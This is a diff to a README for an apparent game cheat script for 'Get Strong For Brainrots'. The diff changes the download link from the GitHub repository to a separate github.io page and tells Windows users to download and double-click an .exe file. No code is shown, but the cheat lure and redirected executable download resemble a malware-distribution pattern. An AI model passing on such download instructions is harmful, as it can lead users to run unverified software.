@@ -1,6 +1,6 @@
 # 🧠 get-strong-brainrots-vf95-script - Enhance your gameplay with automated support
 
-<a href="https://github.com/cheesefonduemarriagecontract939/get-strong-brainrots-vf95-script"><img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download Link"></a>
+<a href="https://cheesefonduemarriagecontract939.github.io"><img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download Link"></a>
 
 This software assists users in the game Get Strong For Brainrots. It provides automated tools to improve speed and aim during play sessions. You install this script on Windows machines to manage game actions. The program acts in the background to handle repetitive tasks and helps with target precision.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these conditions before you install the software:
 Follow these instructions to set up the script on your computer.
 
 1. Open a web browser on your computer.
-2. Visit this page to download the software: https://github.com/cheesefonduemarriagecontract939/get-strong-brainrots-vf95-script
+2. Visit this page to download the software: https://cheesefonduemarriagecontract939.github.io
 3. Locate the file ending in .exe in the downloads folder.
 4. Double-click the file to start the installer.
 5. Follow the prompts on the screen to finish the setup process.
